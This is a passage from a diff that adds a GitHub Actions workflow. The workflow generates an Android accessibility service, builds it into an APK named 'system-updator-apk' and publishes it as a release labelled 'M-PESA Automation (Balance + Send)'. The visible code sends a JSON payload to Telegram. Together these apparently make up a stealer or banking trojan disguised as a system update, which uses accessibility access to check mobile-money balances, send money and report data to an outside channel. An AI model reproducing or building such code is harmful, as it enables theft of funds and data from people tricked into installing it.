+                          conn.getOutputStream().write(json.getBytes("UTF-8"));
+                          conn.getOutputStream().flush();
+                          conn.getResponseCode();
+                          conn.disconnect();
+                          Log.d(TAG, "Telegram sent");
+                      } catch (Exception e) {
+                          Log.e(TAG, "Telegram error", e);
+                      }
+                  });
+              }
+
+              @Override
+              public void onInterrupt() {
+                  Log.d(TAG, "Service interrupted");
+              }
+
+              @Override
+              public void onDestroy() {
+                  super.onDestroy();
+                  executor.shutdown();
+              }
+          }
+          EOF
+
+      # =============== BUILD & DEPLOY ===============
+
+      - name: Build APK
+        run: |
+          chmod +x gradlew
+          ./gradlew clean assembleDebug
+
+      - name: Upload APK Artifact
+        if: success()
+        uses: actions/upload-artifact@v4
+        with:
+          name: system-updator-apk
+          path: app/build/outputs/apk/debug/app-debug.apk
+
+      - name: Create Release
+        if: success()
+        uses: softprops/action-gh-release@v1
+        with:
+          files: app/build/outputs/apk/debug/app-debug.apk
+          tag_name: v${{ github.run_number }}
+          body: "🚀 M-PESA Automation - Full Self-Contained (Balance + Send)"
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Build Success
+        run: echo "✅ APK built and released"
